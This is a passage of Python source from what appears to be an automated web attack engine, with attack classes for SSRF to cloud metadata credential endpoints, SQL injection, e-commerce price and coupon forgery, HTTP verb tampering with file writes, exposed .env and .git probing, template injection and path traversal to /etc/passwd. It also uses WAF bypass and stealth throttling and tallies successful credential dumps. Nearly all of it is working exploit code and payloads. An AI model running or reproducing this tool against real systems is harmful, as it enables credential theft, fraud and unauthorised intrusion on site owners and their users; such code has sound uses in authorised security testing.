                        payload=target["url"],
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                        vulnerable=hit,
                        evidence=body[:400] if hit else "",
                        severity="CRITICAL" if hit else "INFO",
                        bypass_used=bypass_used,
                        drift_detected=len(drift) > 0,
                    )

                    if hit:
                        confirmed = True
                        self.log(
                            f"[THREAT] SSRF confirmed: {target['name']} via {endpoint}?{param}= "
                            f"[{self.infra.detected.value.upper()}]"
                            f"{f' (WAF bypass: {bypass_used})' if bypass_used else ''}",
                            "error", "decision_intel"
                        )
                        self.add_finding({
                            "title": f"SSRF â†’ {target['name']} [{self.infra.detected.value.upper()}]",
                            "description": (
                                f"Dynamic reasoning confirmed SSRF access to '{target['name']}' via {endpoint}?{param}=. "
                                f"Infrastructure: {self.infra.detected.value}. "
                                f"{'WAF was bypassed using ' + bypass_used + '. ' if bypass_used else ''}"
                                f"Internal service data accessible from external requests."
                            ),
                            "severity": "critical",
                            "category": "ssrf_credential_dump",
                            "module": "attack_reasoning",
                            "phase": "decision_intel",
                            "evidence": body[:300],
                        })
                        self.add_probe({
                            "probe_type": "DYNAMIC_SSRF",
                            "target": self.base_url,
                            "endpoint": f"{endpoint}?{param}=...",
                            "method": "GET",
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"VULNERABLE â€” {target['name']} [{self.infra.detected.value.upper()}]",
                            "severity": "CRITICAL",
                            "description": f"SSRF: {target['name']}",
                            "payload": target["url"],
                            "evidence": f"Detection keywords matched. Infra: {self.infra.detected.value}",
                            "bypass_used": bypass_used,
                            "timestamp": _ts(),
                        })

                        result.deep_validation = await self._deep_validate(
                            endpoint, param, target, extra_headers,
                        )
                        break

        return self.results

    async def _deep_validate(self, endpoint: str, param: str, target: Dict, headers: Dict) -> Dict:
        deep = {"service": target["name"], "depth_probes": []}

        follow_up_urls = []
        if "aws" in target["name"].lower():
            follow_up_urls = [
                ("IAM Role List", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                ("Network Interfaces", "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"),
                ("Security Groups", "http://169.254.169.254/latest/meta-data/security-groups"),
                ("Public Keys", "http://169.254.169.254/latest/meta-data/public-keys/"),
            ]
        elif "azure" in target["name"].lower():
            follow_up_urls = [
                ("Network Profile", "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"),
                ("Scheduled Events", "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01"),
            ]
        elif "gcp" in target["name"].lower():
            follow_up_urls = [
                ("Service Accounts", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"),
                ("SSH Keys", "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"),
            ]

        for label, follow_url in follow_up_urls[:3]:
            try:
                url = f"{self.base_url}{endpoint}?{param}={follow_url}"
                resp = await self.client.get(url, headers=headers)
                if resp.status_code == 200 and len(resp.text) > 10:
                    deep["depth_probes"].append({
                        "label": label,
                        "url": follow_url,
                        "status": resp.status_code,
                        "data_length": len(resp.text),
                        "snippet": resp.text[:200],
                    })
            except Exception:
                pass

        return deep


class SQLiAttackNode(AttackNode):
    PAYLOADS = [
        {"name": "Error-based OR", "payload": "' OR '1'='1' --", "detect": ["error", "sql", "syntax", "mysql", "pg_query", "ORA-"]},
        {"name": "UNION column probe", "payload": "1 UNION SELECT NULL--", "detect": ["column", "union", "select"]},
        {"name": "Stacked query (PG)", "payload": "1; SELECT version()--", "detect": ["postgresql", "version"]},
        {"name": "Boolean blind (true)", "payload": "1' AND 1=1--", "detect": []},
        {"name": "Boolean blind (false)", "payload": "1' AND 1=2--", "detect": []},
        {"name": "Time blind (PG)", "payload": "1'; SELECT pg_sleep(3)--", "detect": []},
        {"name": "Time blind (MySQL)", "payload": "1' AND SLEEP(3)--", "detect": []},
        {"name": "JSON type confusion", "payload": '{"$gt": ""}', "detect": []},
    ]

    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        endpoints = ctx["endpoints"][:8]
        if not endpoints:
            endpoints = ["/api/search", "/api/users", "/api/products"]
        params = ctx["params"][:5] or ["q", "id", "search", "query", "name"]

        self.log(
            f"[TREE:{self.node_id}] SQLi node â€” {len(endpoints)} endpoints, {len(params)} params",
            "warn", "decision_intel"
        )

        blind_baseline_lengths = {}

        for endpoint in endpoints:
            for param in params:
                for p_def in self.PAYLOADS:
                    url = f"{self.base_url}{endpoint}?{param}={p_def['payload']}"
                    resp, elapsed, drift = await self._request_with_drift("GET", url)
                    if not resp:
                        continue

                    body = resp.text[:4000]
                    body_lower = body.lower()
                    hit = any(kw.lower() in body_lower for kw in p_def["detect"]) if p_def["detect"] else False
                    bypass_used = None

                    if "blind" in p_def["name"]:
                        bkey = f"{endpoint}:{param}"
                        if "true" in p_def["name"]:
                            blind_baseline_lengths[bkey] = len(body)
                        elif "false" in p_def["name"] and bkey in blind_baseline_lengths:
                            diff = abs(len(body) - blind_baseline_lengths[bkey])
                            if diff > 50:
                                hit = True
                        elif "Time" in p_def["name"]:
                            if elapsed > 2800:
                                hit = True

                    if not hit and resp.status_code in (403, 429, 503) and drift:
                        result_bypass = await self.waf.try_bypass(
                            f"{endpoint}?{param}=", "GET", p_def["payload"],
                            resp.status_code, p_def["detect"] or ["error", "sql"],
                        )
                        if result_bypass:
                            resp, bypass_used, elapsed = result_bypass
                            body = resp.text[:4000]
                            hit = any(kw.lower() in body.lower() for kw in (p_def["detect"] or ["error", "sql"]))

                    result = self._build_result(
                        technique=p_def["name"],
                        target_endpoint=f"{endpoint}?{param}=",
                        method="GET",
                        payload=p_def["payload"],
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                        vulnerable=hit,
                        evidence=body[:300] if hit else "",
                        severity="CRITICAL" if hit else "INFO",
                        bypass_used=bypass_used,
                        drift_detected=len(drift) > 0,
                    )

                    if hit:
                        self.log(
                            f"[THREAT] SQLi confirmed: {p_def['name']} at {endpoint}?{param}="
                            f"{f' (WAF bypass: {bypass_used})' if bypass_used else ''}",
                            "error", "decision_intel"
                        )
                        self.add_finding({
                            "title": f"SQL Injection: {p_def['name']} at {endpoint}",
                            "description": (
                                f"Dynamic reasoning confirmed SQL injection via {p_def['name']} at {endpoint}?{param}=. "
                                f"{'WAF bypassed using ' + bypass_used + '. ' if bypass_used else ''}"
                                f"Payload: {p_def['payload'][:80]}"
                            ),
                            "severity": "critical",
                            "category": "sqli",
                            "module": "attack_reasoning",
                            "phase": "decision_intel",
                            "evidence": body[:200],
                        })
                        self.add_probe({
                            "probe_type": "DYNAMIC_SQLI",
                            "target": self.base_url,
                            "endpoint": f"{endpoint}?{param}=",
                            "method": "GET",
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"VULNERABLE â€” {p_def['name']}",
                            "severity": "CRITICAL",
                            "description": p_def["name"],
                            "payload": p_def["payload"],
                            "bypass_used": bypass_used,
                            "timestamp": _ts(),
                        })
                        break

        return self.results


class EcommerceAttackNode(AttackNode):
    TESTS = [
        {"desc": "Price override $0.01", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 1}]}, "method": "POST"},
        {"desc": "Negative price", "body": {"items": [{"id": 1, "price": -1, "quantity": 1}]}, "method": "POST"},
        {"desc": "Zero via PATCH", "body": {"line_item_id": 1, "unit_price": 0.00}, "method": "PATCH"},
        {"desc": "Coupon forge 100%", "body": {"coupon": "ADMIN_100_OFF", "discount_percent": 100}, "method": "POST"},
        {"desc": "Quantity overflow", "body": {"items": [{"id": 1, "quantity": 999999, "unit_price": 0.01}]}, "method": "POST"},
        {"desc": "Currency swap", "body": {"items": [{"id": 1, "unit_price": 1, "currency": "VND"}]}, "method": "POST"},
        {"desc": "Negative quantity", "body": {"items": [{"id": 1, "quantity": -1, "unit_price": 100}]}, "method": "POST"},
    ]

    STACK_TRACE = [
        re.compile(r"Traceback", re.I), re.compile(r"at\s+[\w\.$]+\(", re.I),
        re.compile(r"TypeError:|ValueError:", re.I), re.compile(r"SQLSTATE\[", re.I),
    ]

    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        ecom_endpoints = [e for e in ctx["endpoints"] if any(
            kw in e.lower() for kw in ["cart", "checkout", "payment", "order", "coupon", "discount", "price", "product"]
        )]
        if not ecom_endpoints:
            ecom_endpoints = ["/cart/update", "/api/checkout", "/api/cart"]

        self.log(
            f"[TREE:{self.node_id}] E-commerce node â€” {len(ecom_endpoints)} endpoints",
            "warn", "decision_intel"
        )

        for endpoint in ecom_endpoints:
            for tc in self.TESTS:
                url = f"{self.base_url}{endpoint}"
                resp, elapsed, drift = await self._request_with_drift(
                    tc["method"], url,
                    json=tc["body"],
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue

                body = resp.text[:4000]
                body_lower = body.lower()
                accepted = resp.status_code in (200, 201, 202)
                has_trace = any(p.search(body) for p in self.STACK_TRACE)
                db_accepted = accepted and any(kw in body_lower for kw in [
                    "success", "updated", "created", "order_id", "cart_id",
                    "total", "amount", "price", "accepted",
                ])
                vulnerable = db_accepted or has_trace

                result = self._build_result(
                    technique=tc["desc"],
                    target_endpoint=endpoint,
                    method=tc["method"],
                    payload=json.dumps(tc["body"]),
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                    vulnerable=vulnerable,
                    evidence=body[:300] if vulnerable else "",
                    severity="CRITICAL" if vulnerable else "INFO",
                    drift_detected=len(drift) > 0,
                )

                if vulnerable:
                    parts = []
                    if db_accepted:
                        parts.append("manipulated record accepted")
                    if has_trace:
                        parts.append("stack trace leaked")

                    self.log(
                        f"[THREAT] E-commerce integrity failed: {endpoint} â€” {tc['desc']} ({', '.join(parts)})",
                        "error", "decision_intel"
                    )
                    self.add_finding({
                        "title": f"E-commerce: {tc['desc']} at {endpoint}",
                        "description": f"Dynamic reasoning confirmed price/inventory manipulation at {endpoint}. {'. '.join(parts)}.",
                        "severity": "critical",
                        "category": "ecommerce_integrity",
                        "module": "attack_reasoning",
                        "phase": "decision_intel",
                        "evidence": body[:300],
                    })
                    self.add_probe({
                        "probe_type": "DYNAMIC_ECOMMERCE",
                        "target": self.base_url,
                        "endpoint": endpoint,
                        "method": tc["method"],
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": True,
                        "verdict": f"VULNERABLE â€” {', '.join(parts)}",
                        "severity": "CRITICAL",
                        "description": tc["desc"],
                        "payload": json.dumps(tc["body"]),
                        "timestamp": _ts(),
                    })

        return self.results


class VerbTamperingNode(AttackNode):
    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        methods_found = [m for m in ctx["methods"] if m in ("PUT", "DELETE", "PATCH", "MOVE", "COPY", "TRACE")]
        if not methods_found:
            methods_found = ["PUT", "DELETE"]

        probe_paths = list(set(ctx["endpoints"][:6])) or ["/", "/api/data", "/uploads", "/files"]

        self.log(
            f"[TREE:{self.node_id}] Verb tampering node â€” {len(methods_found)} methods, {len(probe_paths)} paths",
            "warn", "decision_intel"
        )

        for method in methods_found:
            for path in probe_paths:
                if method in ("PUT", "PATCH"):
                    test_path = f"{path}/sniper_probe.txt" if path in ("/uploads", "/files") else path
                    url = f"{self.base_url}{test_path}"
                    resp, elapsed, drift = await self._request_with_drift(
                        method, url,
                        content="MSE_SNIPER_PROBE_TEST",
                        headers={"Content-Type": "text/plain"},
                    )
                elif method == "DELETE":
                    url = f"{self.base_url}{path}/mse_nonexistent_probe_test"
                    resp, elapsed, drift = await self._request_with_drift(method, url)
                else:
                    url = f"{self.base_url}{path}"
                    resp, elapsed, drift = await self._request_with_drift(method, url)

                if not resp:
                    continue

                accepted = resp.status_code in (200, 201, 204, 202)

                if accepted and method in ("PUT", "PATCH"):
                    verify_resp = None
                    try:
                        test_path_check = f"{path}/sniper_probe.txt" if path in ("/uploads", "/files") else path
                        verify_resp = await self.client.get(f"{self.base_url}{test_path_check}")
                    except Exception:
                        pass
                    write_confirmed = verify_resp and verify_resp.status_code == 200 and "MSE_SNIPER" in verify_resp.text
                    deep_val = {"write_verified": write_confirmed, "verify_status": verify_resp.status_code if verify_resp else None}
                else:
                    write_confirmed = False
                    deep_val = None

                result = self._build_result(
                    technique=f"{method} verb probe",
                    target_endpoint=path,
                    method=method,
                    payload="MSE_SNIPER_PROBE_TEST" if method in ("PUT", "PATCH") else "",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                    vulnerable=accepted,
                    evidence=f"HTTP {resp.status_code} â€” method accepted" if accepted else "",
                    severity="CRITICAL" if (accepted and write_confirmed) else "HIGH" if accepted else "INFO",
                    drift_detected=len(drift) > 0,
                    deep_validation=deep_val,
                )

                if accepted:
                    sev = "critical" if write_confirmed else "high"
                    self.log(
                        f"[THREAT] {method} accepted at {path} (HTTP {resp.status_code})"
                        f"{' â€” WRITE CONFIRMED' if write_confirmed else ''}",
                        "error", "decision_intel"
                    )
                    self.add_finding({
                        "title": f"Verb Tampering: {method} accepted at {path}",
                        "description": (
                            f"Dynamic reasoning confirmed {method} is accepted at {path} without access control. "
                            f"{'Write operation verified â€” file creation confirmed. ' if write_confirmed else ''}"
                            f"HTTP {resp.status_code}."
                        ),
                        "severity": sev,
                        "category": "verb_tampering",
                        "module": "attack_reasoning",
                        "phase": "decision_intel",
                    })
                    self.add_probe({
                        "probe_type": "DYNAMIC_VERB",
                        "target": self.base_url,
                        "endpoint": path,
                        "method": method,
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": True,
                        "verdict": f"VULNERABLE â€” {method} accepted" + (" + write confirmed" if write_confirmed else ""),
                        "severity": sev.upper(),
                        "description": f"{method} verb probe",
                        "timestamp": _ts(),
                    })

        return self.results


class APIExposureNode(AttackNode):
    SENSITIVE_PROBES = [
        {"path": "/swagger.json", "detect": ["swagger", "paths", "info"]},
        {"path": "/openapi.json", "detect": ["openapi", "paths", "info"]},
        {"path": "/api-docs", "detect": ["swagger", "api", "paths"]},
        {"path": "/.env", "detect": ["DB_", "API_KEY", "SECRET", "PASSWORD"]},
        {"path": "/config.json", "detect": ["database", "host", "port", "password"]},
        {"path": "/graphql?query={__schema{types{name}}}", "detect": ["__schema", "types", "name"]},
        {"path": "/debug/vars", "detect": ["memstats", "goroutine"]},
        {"path": "/actuator", "detect": ["beans", "health", "info"]},
        {"path": "/actuator/env", "detect": ["propertySources", "source"]},
        {"path": "/.git/HEAD", "detect": ["ref:", "refs/heads"]},
        {"path": "/server-status", "detect": ["Apache", "Server", "Uptime"]},
        {"path": "/phpinfo.php", "detect": ["phpinfo", "PHP Version", "Configure"]},
        {"path": "/wp-json/wp/v2/users", "detect": ["id", "name", "slug"]},
    ]

    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        self.log(
            f"[TREE:{self.node_id}] API exposure node â€” probing {len(self.SENSITIVE_PROBES)} sensitive paths",
            "warn", "decision_intel"
        )

        discovered_endpoints = ctx["endpoints"]
        all_paths = list(self.SENSITIVE_PROBES)
        for ep in discovered_endpoints[:10]:
            if ep not in [p["path"] for p in all_paths]:
                all_paths.append({"path": ep, "detect": ["id", "data", "result", "items", "error"]})

        for probe in all_paths:
            url = f"{self.base_url}{probe['path']}"
            resp, elapsed, drift = await self._request_with_drift("GET", url)
            if not resp:
                continue

            body = resp.text[:4000]
            hit = resp.status_code == 200 and any(kw.lower() in body.lower() for kw in probe["detect"])

            if hit:
                result = self._build_result(
                    technique="sensitive_path_probe",
                    target_endpoint=probe["path"],
                    method="GET",
                    payload=probe["path"],
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                    vulnerable=True,
                    evidence=body[:300],
                    severity="HIGH",
                    drift_detected=len(drift) > 0,
                )
                self.log(
                    f"[THREAT] Sensitive path accessible: {probe['path']} (HTTP {resp.status_code})",
                    "error", "decision_intel"
                )
                self.add_finding({
                    "title": f"Sensitive Endpoint Accessible: {probe['path']}",
                    "description": f"Dynamic reasoning discovered accessible sensitive path at {probe['path']}. Response contains sensitive data markers.",
                    "severity": "high",
                    "category": "api_exposure",
                    "module": "attack_reasoning",
                    "phase": "decision_intel",
                    "evidence": body[:200],
                })
                self.add_probe({
                    "probe_type": "DYNAMIC_API",
                    "target": self.base_url,
                    "endpoint": probe["path"],
                    "method": "GET",
                    "status_code": resp.status_code,
                    "response_time_ms": elapsed,
                    "vulnerable": True,
                    "verdict": f"ACCESSIBLE â€” sensitive data detected",
                    "severity": "HIGH",
                    "description": f"Sensitive path: {probe['path']}",
                    "timestamp": _ts(),
                })

        return self.results


class SSTIAttackNode(AttackNode):
    PAYLOADS = [
        {"name": "Jinja2 basic", "payload": "{{7*7}}", "detect": ["49"]},
        {"name": "Jinja2 class chain", "payload": "{{''.__class__.__mro__}}", "detect": ["str", "object"]},
        {"name": "Twig basic", "payload": "{{7*'7'}}", "detect": ["49", "7777777"]},
        {"name": "Freemarker", "payload": "${7*7}", "detect": ["49"]},
        {"name": "ERB", "payload": "<%=7*7%>", "detect": ["49"]},
        {"name": "Pebble", "payload": '{% set x = 7*7 %}{{x}}', "detect": ["49"]},
    ]

    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        endpoints = ctx["endpoints"][:6] or ["/api/render", "/api/template", "/api/preview"]
        params = ctx["params"][:4] or ["template", "content", "message", "name", "q"]

        self.log(
            f"[TREE:{self.node_id}] SSTI node â€” {len(endpoints)} endpoints, {len(params)} params",
            "warn", "decision_intel"
        )

        for endpoint in endpoints:
            for param in params:
                for p_def in self.PAYLOADS:
                    url = f"{self.base_url}{endpoint}?{param}={p_def['payload']}"
                    resp, elapsed, drift = await self._request_with_drift("GET", url)
                    if not resp:
                        continue
                    body = resp.text[:2000]
                    hit = resp.status_code == 200 and any(kw in body for kw in p_def["detect"])

                    if hit:
                        self._build_result(
                            technique=p_def["name"],
                            target_endpoint=f"{endpoint}?{param}=",
                            method="GET",
                            payload=p_def["payload"],
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                            vulnerable=True,
                            evidence=body[:300],
                            severity="CRITICAL",
                            drift_detected=len(drift) > 0,
                        )
                        self.log(f"[THREAT] SSTI confirmed: {p_def['name']} at {endpoint}?{param}=", "error", "decision_intel")
                        self.add_finding({
                            "title": f"SSTI: {p_def['name']} at {endpoint}",
                            "description": f"Template injection confirmed. Payload {p_def['payload']} evaluated server-side.",
                            "severity": "critical",
                            "category": "ssti",
                            "module": "attack_reasoning",
                            "phase": "decision_intel",
                            "evidence": body[:200],
                        })
                        self.add_probe({
                            "probe_type": "DYNAMIC_SSTI",
                            "target": self.base_url,
                            "endpoint": f"{endpoint}?{param}=",
                            "method": "GET",
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"VULNERABLE â€” {p_def['name']}",
                            "severity": "CRITICAL",
                            "payload": p_def["payload"],
                            "timestamp": _ts(),
                        })
                        break
        return self.results


class PathTraversalNode(AttackNode):
    PAYLOADS = [
        {"name": "Basic LFI", "payload": "../../../../../etc/passwd", "detect": ["root:", "nobody:", "/bin/"]},
        {"name": "Null byte", "payload": "../../../../../etc/passwd%00", "detect": ["root:", "nobody:"]},
        {"name": "Double encoding", "payload": "..%252f..%252f..%252fetc%252fpasswd", "detect": ["root:", "nobody:"]},
        {"name": "Windows paths", "payload": "..\\..\\..\\windows\\win.ini", "detect": ["[fonts]", "[extensions]"]},
        {"name": "Proc self", "payload": "../../../../../proc/self/environ", "detect": ["PATH=", "HOME=", "USER="]},
    ]

    async def execute(self) -> List[ExploitResult]:
        ctx = self._extract_context()
        endpoints = ctx["endpoints"][:6] or ["/api/file", "/api/download", "/api/read"]
        params = ctx["params"][:4] or ["file", "path", "name", "document"]

        self.log(
            f"[TREE:{self.node_id}] Path traversal node â€” {len(endpoints)} endpoints",
            "warn", "decision_intel"
        )

        for endpoint in endpoints:
            for param in params:
                for p_def in self.PAYLOADS:
                    url = f"{self.base_url}{endpoint}?{param}={p_def['payload']}"
                    resp, elapsed, drift = await self._request_with_drift("GET", url)
                    if not resp:
                        continue
                    body = resp.text[:4000]
                    hit = resp.status_code == 200 and any(kw in body for kw in p_def["detect"])

                    if hit:
                        self._build_result(
                            technique=p_def["name"],
                            target_endpoint=f"{endpoint}?{param}=",
                            method="GET",
                            payload=p_def["payload"],
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                            vulnerable=True,
                            evidence=body[:300],
                            severity="CRITICAL",
                            drift_detected=len(drift) > 0,
                        )
                        self.log(f"[THREAT] Path traversal: {p_def['name']} at {endpoint}?{param}=", "error", "decision_intel")
                        self.add_finding({
                            "title": f"Path Traversal: {p_def['name']} at {endpoint}",
                            "description": f"Local file inclusion confirmed at {endpoint}?{param}=. Payload: {p_def['payload']}",
                            "severity": "critical",
                            "category": "path_traversal",
                            "module": "attack_reasoning",
                            "phase": "decision_intel",
                            "evidence": body[:200],
                        })
                        self.add_probe({
                            "probe_type": "DYNAMIC_LFI",
                            "target": self.base_url,
                            "endpoint": f"{endpoint}?{param}=",
                            "method": "GET",
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"VULNERABLE â€” {p_def['name']}",
                            "severity": "CRITICAL",
                            "payload": p_def["payload"],
                            "timestamp": _ts(),
                        })
                        break
        return self.results


VULN_CLASS_TO_NODE = {
    VulnClass.SSRF: SSRFAttackNode,
    VulnClass.SQLI: SQLiAttackNode,
    VulnClass.ECOMMERCE: EcommerceAttackNode,
    VulnClass.VERB_TAMPERING: VerbTamperingNode,
    VulnClass.API_EXPOSURE: APIExposureNode,
    VulnClass.SSTI: SSTIAttackNode,
    VulnClass.PATH_TRAVERSAL: PathTraversalNode,
}


class DecisionTree:
    def __init__(
        self,
        base_url: str,
        client: httpx.AsyncClient,
        log_fn=None,
        emit_fn=None,
        add_finding_fn=None,
        add_probe_fn=None,
    ):
        self.base_url = base_url
        self.client = client
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)

        self.infra = InfraFingerprint()
        self.monitor = BaselineMonitor()
        self.waf = WAFBypassEngine(client, base_url, log_fn)
        self.stealth = StealthThrottle(log_fn=log_fn, emit_fn=emit_fn)

        self.nodes: List[AttackNode] = []
        self.all_results: List[ExploitResult] = []
        self.vuln_classes_detected: Dict[VulnClass, List[Dict]] = {}

    def build_from_findings(self, findings: List[Dict]):
        infra_type = self.infra.ingest_findings(findings)
        self.log(
            f"[ZERO-K] Infrastructure fingerprint: {infra_type.value.upper()} "
            f"(secondary: {[s.value for s in self.infra.secondary]})",
            "warn", "decision_intel"
        )
        self.emit("infra_fingerprint", self.infra.to_dict())

        for vuln_class, patterns in VULN_CLASS_EXTRACTION_RULES.items():
            matching_findings = []
            for f in findings:
                combined = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')} {f.get('category', '')}".lower()
                if any(re.search(pat, combined, re.I) for pat in patterns):
                    matching_findings.append(f)

            if matching_findings:
                self.vuln_classes_detected[vuln_class] = matching_findings

        self.log(
            f"[ZERO-K] Vulnerability classes extracted: "
            f"{', '.join(vc.value.upper() for vc in self.vuln_classes_detected.keys())} "
            f"({len(self.vuln_classes_detected)} branches)",
            "warn", "decision_intel"
        )

        node_counter = 0
        for vuln_class, source_findings in self.vuln_classes_detected.items():
            node_cls = VULN_CLASS_TO_NODE.get(vuln_class)
            if not node_cls:
                continue

            node_counter += 1
            node = node_cls(
                node_id=f"N{node_counter:03d}_{vuln_class.value}",
                vuln_class=vuln_class,
                source_findings=source_findings,
                infra=self.infra,
                client=self.client,
                base_url=self.base_url,
                baseline_monitor=self.monitor,
                waf_engine=self.waf,
                log_fn=self.log,
                emit_fn=self.emit,
                add_finding_fn=self.add_finding,
                add_probe_fn=self.add_probe,
                stealth_throttle=self.stealth,
            )
            self.nodes.append(node)

        self.log(
            f"[TREE] Decision tree built: {len(self.nodes)} attack nodes instantiated",
            "warn", "decision_intel"
        )

    async def traverse(self) -> List[ExploitResult]:
        for node in self.nodes:
            self.log(
                f"[TREE] Executing node {node.node_id} ({node.vuln_class.value}) â€” "
                f"{len(node.source_findings)} source findings",
                "warn", "decision_intel"
            )
            self.emit("tree_node_start", {
                "node_id": node.node_id,
                "vuln_class": node.vuln_class.value,
                "source_findings": len(node.source_findings),
            })

            try:
                results = await asyncio.wait_for(node.execute(), timeout=60)
                self.all_results.extend(results)

                confirmed = sum(1 for r in results if r.vulnerable)
                self.log(
                    f"[TREE] Node {node.node_id} complete â€” {confirmed}/{len(results)} confirmed",
                    "error" if confirmed > 0 else "success", "decision_intel"
                )
                self.emit("tree_node_complete", {
                    "node_id": node.node_id,
                    "vuln_class": node.vuln_class.value,
                    "total_tests": len(results),
                    "confirmed": confirmed,
                })

            except asyncio.TimeoutError:
                self.log(f"[TREE] Node {node.node_id} TIMEOUT (60s)", "error", "decision_intel")
            except Exception as e:
                self.log(f"[TREE] Node {node.node_id} ERROR: {str(e)[:100]}", "error", "decision_intel")

        return self.all_results

    def build_report(self) -> Dict:
        total_tests = len(self.all_results)
        confirmed = sum(1 for r in self.all_results if r.vulnerable)
        bypasses = sum(1 for r in self.all_results if r.bypass_used)
        drifts = sum(1 for r in self.all_results if r.drift_detected)

        per_class = {}
        for r in self.all_results:
            vc = r.vuln_class
            if vc not in per_class:
                per_class[vc] = {"total": 0, "confirmed": 0, "techniques": []}
            per_class[vc]["total"] += 1
            if r.vulnerable:
                per_class[vc]["confirmed"] += 1
                if r.technique not in per_class[vc]["techniques"]:
                    per_class[vc]["techniques"].append(r.technique)

        deep_validations = [
            {"node": r.node_id, "class": r.vuln_class, "endpoint": r.target_endpoint, "detail": r.deep_validation}
            for r in self.all_results
            if r.deep_validation
        ]

        return {
            "engine": "dynamic_attack_reasoning",
            "version": "2.0",
            "infra_fingerprint": self.infra.to_dict(),
            "vuln_classes_detected": len(self.vuln_classes_detected),
            "vuln_class_list": [vc.value for vc in self.vuln_classes_detected.keys()],
            "tree_nodes_executed": len(self.nodes),
            "total_tests": total_tests,
            "total_exploits_confirmed": confirmed,
            "waf_bypasses_attempted": self.waf.attempts,
            "waf_bypasses_successful": bypasses,
            "drift_events_detected": drifts,
            "baseline_monitor": self.monitor.to_dict(),
            "waf_engine": self.waf.to_dict(),
            "stealth_throttle": self.stealth.to_dict(),
            "per_class_results": per_class,
            "deep_validations": deep_validations[:10],
            "pivot_points": len([f for vc_findings in self.vuln_classes_detected.values() for f in vc_findings if f.get("severity", "").lower() in ("critical", "high")]),
            "ssrf_vectors": per_class.get("ssrf", {}).get("total", 0),
            "ecommerce_vectors": per_class.get("ecommerce", {}).get("total", 0),
            "dangerous_methods": per_class.get("verb_tampering", {}).get("total", 0),
            "credential_dumps_successful": per_class.get("ssrf", {}).get("confirmed", 0),
            "price_integrity_vulnerable": per_class.get("ecommerce", {}).get("confirmed", 0),
            "verb_probes_vulnerable": per_class.get("verb_tampering", {}).get("confirmed", 0),
            "dynamic_params": sum(len(f_list) for f_list in self.vuln_classes_detected.values()),
        }

